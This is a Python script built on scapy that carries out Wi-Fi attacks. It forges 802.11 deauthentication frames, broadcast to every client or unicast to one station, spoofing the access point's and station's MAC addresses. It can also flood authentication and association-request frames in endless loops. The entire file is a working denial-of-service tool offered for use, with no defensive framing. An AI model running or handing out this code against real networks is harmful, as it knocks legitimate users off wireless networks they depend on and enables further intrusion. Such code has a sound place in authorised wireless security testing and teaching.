import os, sys, time
from argparse import ArgumentParser as AP
from scapy.all import *

def usage():
    print("syntax : deauth-attack <interface> <ap mac> [<station mac> [-auth]]\n")
    print("sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB")

def deauth(interface, ap_mac):
    # AP broadcast
    dot11 = Dot11(type=0, subtype=12, addr1 = 'ff:ff:ff:ff:ff:ff', addr2 = ap_mac, addr3 = ap_mac)
    frame = RadioTap()/dot11/Dot11Deauth(reason=7)
    sendp(frame, iface=interface, inter=0.100, loop=1)
    
def deauth_unicast(interface, ap_mac, station_mac):
    while True:
        # AP unicast
        dot11 = Dot11(type=0, subtype=12, addr1 = station_mac, addr2 = ap_mac, addr3 = ap_mac)
        frame1 = RadioTap()/dot11/Dot11Deauth(reason=7)
        # Station unicast
        dot11 = Dot11(type=0, subtype=12, addr1 = ap_mac, addr2 = station_mac, addr3 = ap_mac)
        frame2 = RadioTap()/dot11/Dot11Deauth(reason=7)
        sendp(frame1, iface=interface, inter=0.100, loop=0)
        sendp(frame2, iface=interface, inter=0.100, loop=0)

def auth(interface, ap_mac, station_mac):
    while True:
        dot11 = Dot11(type=0, subtype=11, addr1 = ap_mac, addr2 = station_mac, addr3 = ap_mac)
        frame1 = RadioTap()/dot11/Dot11Auth(seqnum=1)
        frame2 = RadioTap()/dot11/Dot11AssoReq()
        sendp(frame1, iface=interface, inter=0.100, loop=0)
        sendp(frame2, iface=interface, inter=0.100, loop=0)

if __name__ == "__main__":
    parser = AP(description="Perform Deauth & Auth attack")
    parser.add_argument("interface",help="Network interface")
    parser.add_argument("ap_mac",help="AP Mac Address")
    parser.add_argument("station_mac",nargs="?",help="Station Mac Address")
    parser.add_argument("-auth",nargs="?",default="deauth",help="Auth attack")
    args = parser.parse_args()
    
    if len(sys.argv) < 3 or len(sys.argv) > 5:
        usage()
        sys.exit()
    
    if args.auth == "auth":
        auth(args.interface, args.ap_mac, args.station_mac)
    else:
        if args.station_mac == None:
            deauth(args.interface, args.ap_mac)
        else:
            deauth_unicast(args.interface, args.ap_mac, args.station_mac)
        
    
